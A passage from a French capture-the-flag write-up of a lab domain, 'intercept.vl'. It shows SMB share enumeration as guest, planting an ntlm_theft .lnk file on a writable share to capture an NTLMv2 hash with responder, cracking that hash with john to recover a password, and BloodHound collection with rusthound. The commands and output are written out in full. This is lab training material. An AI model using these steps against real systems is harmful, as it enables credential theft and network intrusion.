+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="err">\</span><span class="nx">guest</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Enumerated</span> <span class="nx">shares</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="nx">Share</span>           <span class="nx">Permissions</span>     <span class="nx">Remark</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="o">-----</span>           <span class="o">-----------</span>     <span class="o">------</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="nx">ADMIN$</span>                          <span class="nx">Remote</span> <span class="nx">Admin</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="nx">C$</span>                              <span class="nx">Default</span> <span class="nx">share</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="nx">dev</span>             <span class="nx">READ</span><span class="p">,</span><span class="nx">WRITE</span>      <span class="nx">shared</span> <span class="nx">developer</span> <span class="nx">workspace</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="nx">IPC$</span>            <span class="nx">READ</span>            <span class="nx">Remote</span> <span class="nx">IPC</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="nx">Users</span>           <span class="nx">READ</span></span></span></code></pre></div></div>
+<p>Avec <strong>smbclient.py</strong>, j&rsquo;accède au partage dev et je télécharge les deux fichiers <strong>readme.txt</strong> s&rsquo;y trouvant.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">smbclient</span><span class="p">.</span><span class="nx">py</span> <span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="o">/</span><span class="nx">guest</span><span class="err">@</span><span class="nx">ws01</span><span class="p">.</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-1.png"
+        data-srcset="/images/Intercept/Intercept-1.png, /images/Intercept/Intercept-1.png 1.5x, /images/Intercept/Intercept-1.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-1.png"
+        title="/images/Intercept/Intercept-1.png" width="800" height="880" /></p>
+<p>Voici le contenu du premier readme.txt. Il est indiqué qu&rsquo;il faut très souvent consulter ce partages pour des mises à jour de l&rsquo;application. Cela me donne une petite idée d&rsquo;une attaque à effectuer.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">[</span><span class="nx">root</span><span class="err">@</span><span class="nx">exegol</span><span class="o">-</span><span class="nx">intercept</span><span class="p">]</span> <span class="o">/</span><span class="nx">workspace</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">cat</span> <span class="nx">readme</span><span class="p">.</span><span class="nx">txt</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Please</span> <span class="nx">check</span> <span class="k">this</span> <span class="nx">share</span> <span class="nx">regularly</span> <span class="k">for</span> <span class="nx">updates</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">application</span> <span class="p">(</span><span class="k">this</span> <span class="nx">is</span> <span class="nx">a</span> <span class="nx">temporary</span> <span class="nx">solution</span> <span class="nx">until</span> <span class="nx">we</span> <span class="k">switch</span> <span class="nx">to</span> <span class="nx">gitlab</span><span class="p">).</span></span></span></code></pre></div></div>
+<h1 id="connection-as-kathrynspencer">Connection as Kathryn.Spencer</h1>
+<h2 id="rid-brute">RID Brute</h2>
+<p>Mais en attendant, j&rsquo;essais d&rsquo;énumérer les utilisateurs du domaines mais cela ne donne rien.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">[</span><span class="nx">root</span><span class="err">@</span><span class="nx">exegol</span><span class="o">-</span><span class="nx">intercept</span><span class="p">]</span> <span class="o">/</span><span class="nx">workspace</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">nxc</span> <span class="nx">smb</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span><span class="o">-</span><span class="mi">50</span> <span class="o">-</span><span class="nx">u</span> <span class="s1">&#39;guest&#39;</span> <span class="o">-</span><span class="nx">p</span> <span class="s1">&#39;&#39;</span> <span class="o">--</span><span class="nx">rid</span><span class="o">-</span><span class="nx">brute</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span>     <span class="mi">445</span>    <span class="nx">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Windows</span> <span class="nx">Server</span> <span class="mi">2022</span> <span class="nx">Build</span> <span class="mi">20348</span> <span class="nx">x64</span> <span class="p">(</span><span class="nx">name</span><span class="o">:</span><span class="nx">DC01</span><span class="p">)</span> <span class="p">(</span><span class="nx">domain</span><span class="o">:</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="p">)</span> <span class="p">(</span><span class="nx">signing</span><span class="o">:</span><span class="nx">True</span><span class="p">)</span> <span class="p">(</span><span class="nx">SMBv1</span><span class="o">:</span><span class="nx">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Windows</span> <span class="mi">10</span> <span class="o">/</span> <span class="nx">Server</span> <span class="mi">2019</span> <span class="nx">Build</span> <span class="mi">19041</span> <span class="nx">x64</span> <span class="p">(</span><span class="nx">name</span><span class="o">:</span><span class="nx">WS01</span><span class="p">)</span> <span class="p">(</span><span class="nx">domain</span><span class="o">:</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="p">)</span> <span class="p">(</span><span class="nx">signing</span><span class="o">:</span><span class="nx">False</span><span class="p">)</span> <span class="p">(</span><span class="nx">SMBv1</span><span class="o">:</span><span class="nx">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span>     <span class="mi">445</span>    <span class="nx">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="err">\</span><span class="nx">guest</span><span class="o">:</span> <span class="nx">STATUS_ACCOUNT_DISABLED</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="err">\</span><span class="nx">guest</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="mi">500</span><span class="o">:</span> <span class="nx">WS01</span><span class="err">\</span><span class="nx">Administrator</span> <span class="p">(</span><span class="nx">SidTypeUser</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="mi">501</span><span class="o">:</span> <span class="nx">WS01</span><span class="err">\</span><span class="nx">Guest</span> <span class="p">(</span><span class="nx">SidTypeUser</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="mi">503</span><span class="o">:</span> <span class="nx">WS01</span><span class="err">\</span><span class="nx">DefaultAccount</span> <span class="p">(</span><span class="nx">SidTypeUser</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="mi">504</span><span class="o">:</span> <span class="nx">WS01</span><span class="err">\</span><span class="nx">WDAGUtilityAccount</span> <span class="p">(</span><span class="nx">SidTypeUser</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="mi">513</span><span class="o">:</span> <span class="nx">WS01</span><span class="err">\</span><span class="nx">None</span> <span class="p">(</span><span class="nx">SidTypeGroup</span><span class="p">)</span></span></span></code></pre></div></div>
+<h2 id="llmnr-poisonning">LLMNR Poisonning</h2>
+<p>Je reviens ensuite à l&rsquo;attaque dont j&rsquo;ai pensé. Puisqu&rsquo;il est suggérer que certains utilisateurs consulteraient le partage <strong>dev</strong> régulièrement, il se peut qu&rsquo;ils ouvrent des fichiers s&rsquo;y trouvant. Donc je crée un fichier malveillant à mettre dans ce partage.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">ntlm_theft</span><span class="p">.</span><span class="nx">py</span> <span class="o">--</span><span class="nx">verbose</span> <span class="o">--</span><span class="nx">generate</span> <span class="nx">modern</span> <span class="o">--</span><span class="nx">server</span> <span class="s2">&#34;10.10.16.9&#34;</span> <span class="o">--</span><span class="nx">filename</span> <span class="s2">&#34;getMe&#34;</span></span></span></code></pre></div></div>
+<p>Je démarre ensuite <code>responder</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">responder</span> <span class="o">-</span><span class="nx">I</span> <span class="nx">tun0</span></span></span></code></pre></div></div>
+<p>J&rsquo;uploade ensuite le fichier <code>getMe.lnk</code> dans le partage <strong>dev</strong> ; et dans la seconde qui suit je récupère le hash NTLMv2 de <code>Kathryn.Spencer</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-2.png"
+        data-srcset="/images/Intercept/Intercept-2.png, /images/Intercept/Intercept-2.png 1.5x, /images/Intercept/Intercept-2.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-2.png"
+        title="/images/Intercept/Intercept-2.png" width="1285" height="795" /></p>
+<p>Je craque ce hash avec <code>john</code> et je récupère le mot de passe <strong>Chocolate1</strong>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">john</span> <span class="o">--</span><span class="nx">wordlist</span><span class="o">=</span><span class="sb">`fzf-wordlists`</span> <span class="nx">kathryn</span><span class="p">.</span><span class="nx">hash</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-3.png"
+        data-srcset="/images/Intercept/Intercept-3.png, /images/Intercept/Intercept-3.png 1.5x, /images/Intercept/Intercept-3.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-3.png"
+        title="/images/Intercept/Intercept-3.png" width="532" height="287" /></p>
+<p>Ce mot de passe est bien valide sur les deux machines.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">[</span><span class="nx">root</span><span class="err">@</span><span class="nx">exegol</span><span class="o">-</span><span class="nx">intercept</span><span class="p">]</span> <span class="o">/</span><span class="nx">workspace</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">nxc</span> <span class="nx">smb</span> <span class="nx">ws01</span><span class="p">.</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">Kathryn</span><span class="p">.</span><span class="nx">Spencer</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">Chocolate1</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Windows</span> <span class="mi">10</span> <span class="o">/</span> <span class="nx">Server</span> <span class="mi">2019</span> <span class="nx">Build</span> <span class="mi">19041</span> <span class="nx">x64</span> <span class="p">(</span><span class="nx">name</span><span class="o">:</span><span class="nx">WS01</span><span class="p">)</span> <span class="p">(</span><span class="nx">domain</span><span class="o">:</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="p">)</span> <span class="p">(</span><span class="nx">signing</span><span class="o">:</span><span class="nx">False</span><span class="p">)</span> <span class="p">(</span><span class="nx">SMBv1</span><span class="o">:</span><span class="nx">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="err">\</span><span class="nx">Kathryn</span><span class="p">.</span><span class="nx">Spencer</span><span class="o">:</span><span class="nx">Chocolate1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">root</span><span class="err">@</span><span class="nx">exegol</span><span class="o">-</span><span class="nx">intercept</span><span class="p">]</span> <span class="o">/</span><span class="nx">workspace</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">nxc</span> <span class="nx">smb</span> <span class="nx">dc01</span><span class="p">.</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">Kathryn</span><span class="p">.</span><span class="nx">Spencer</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">Chocolate1</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span>     <span class="mi">445</span>    <span class="nx">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Windows</span> <span class="nx">Server</span> <span class="mi">2022</span> <span class="nx">Build</span> <span class="mi">20348</span> <span class="nx">x64</span> <span class="p">(</span><span class="nx">name</span><span class="o">:</span><span class="nx">DC01</span><span class="p">)</span> <span class="p">(</span><span class="nx">domain</span><span class="o">:</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="p">)</span> <span class="p">(</span><span class="nx">signing</span><span class="o">:</span><span class="nx">True</span><span class="p">)</span> <span class="p">(</span><span class="nx">SMBv1</span><span class="o">:</span><span class="nx">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span>     <span class="mi">445</span>    <span class="nx">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="err">\</span><span class="nx">Kathryn</span><span class="p">.</span><span class="nx">Spencer</span><span class="o">:</span><span class="nx">Chocolate1</span></span></span></code></pre></div></div>
+<h1 id="shell-as-simonbowel">Shell as Simon.Bowel</h1>
+<h2 id="bloodhound">Bloodhound</h2>
+<p>J&rsquo;utilise alors <code>rusthound</code> afin de récolter les relations entre les objets du domaine, puis les analyser dans <code>bloodhound-ce</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">[</span><span class="nx">root</span><span class="err">@</span><span class="nx">exegol</span><span class="o">-</span><span class="nx">intercept</span><span class="p">]</span> <span class="o">/</span><span class="nx">workspace</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">rusthound</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">dc01</span><span class="p">.</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">Kathryn</span><span class="p">.</span><span class="nx">Spencer</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">Chocolate1</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span>
+</span></span><span class="line"><span class="cl"><span class="o">---------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Initializing</span> <span class="nx">RustHound</span> <span class="nx">at</span> <span class="mi">22</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">36</span> <span class="nx">on</span> <span class="mi">01</span><span class="o">/</span><span class="mi">19</span><span class="o">/</span><span class="mi">26</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Powered</span> <span class="nx">by</span> <span class="nx">g0h4n</span> <span class="nx">from</span> <span class="nx">OpenCyber</span>
+</span></span><span class="line"><span class="cl"><span class="o">---------------------------------------------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">36</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="p">]</span> <span class="nx">Verbosity</span> <span class="nx">level</span><span class="o">:</span> <span class="nx">Info</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">36</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">ldap</span><span class="p">]</span> <span class="nx">Connected</span> <span class="nx">to</span> <span class="nx">INTERCEPT</span><span class="p">.</span><span class="nx">VL</span> <span class="nx">Active</span> <span class="nx">Directory</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">36</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">ldap</span><span class="p">]</span> <span class="nx">Starting</span> <span class="nx">data</span> <span class="nx">collection</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">ldap</span><span class="p">]</span> <span class="nx">All</span> <span class="nx">data</span> <span class="nx">collected</span> <span class="k">for</span> <span class="nx">NamingContext</span> <span class="nx">DC</span><span class="o">=</span><span class="nx">intercept</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">vl</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">json</span><span class="o">::</span><span class="nx">parser</span><span class="p">]</span> <span class="nx">Starting</span> <span class="nx">the</span> <span class="nx">LDAP</span> <span class="nx">objects</span> <span class="nx">parsing</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">json</span><span class="o">::</span><span class="nx">parser</span><span class="o">::</span><span class="nx">bh_41</span><span class="p">]</span> <span class="nx">MachineAccountQuota</span><span class="o">:</span> <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">json</span><span class="o">::</span><span class="nx">parser</span><span class="p">]</span> <span class="nx">Parsing</span> <span class="nx">LDAP</span> <span class="nx">objects</span> <span class="nx">finished</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">json</span><span class="o">::</span><span class="nx">checker</span><span class="p">]</span> <span class="nx">Starting</span> <span class="nx">checker</span> <span class="nx">to</span> <span class="nx">replace</span> <span class="nx">some</span> <span class="nx">values</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">json</span><span class="o">::</span><span class="nx">checker</span><span class="p">]</span> <span class="nx">Checking</span> <span class="nx">and</span> <span class="nx">replacing</span> <span class="nx">some</span> <span class="nx">values</span> <span class="nx">finished</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">json</span><span class="o">::</span><span class="nx">maker</span><span class="p">]</span> <span class="mi">14</span> <span class="nx">users</span> <span class="nx">parsed</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">json</span><span class="o">::</span><span class="nx">maker</span><span class="p">]</span> <span class="p">.</span><span class="c1">//20260119222137_intercept-vl_users.json created!
+</span></span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">json</span><span class="o">::</span><span class="nx">maker</span><span class="p">]</span> <span class="mi">63</span> <span class="nx">groups</span> <span class="nx">parsed</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">json</span><span class="o">::</span><span class="nx">maker</span><span class="p">]</span> <span class="p">.</span><span class="c1">//20260119222137_intercept-vl_groups.json created!
+</span></span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">json</span><span class="o">::</span><span class="nx">maker</span><span class="p">]</span> <span class="mi">2</span> <span class="nx">computers</span> <span class="nx">parsed</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">json</span><span class="o">::</span><span class="nx">maker</span><span class="p">]</span> <span class="p">.</span><span class="c1">//20260119222137_intercept-vl_computers.json created!
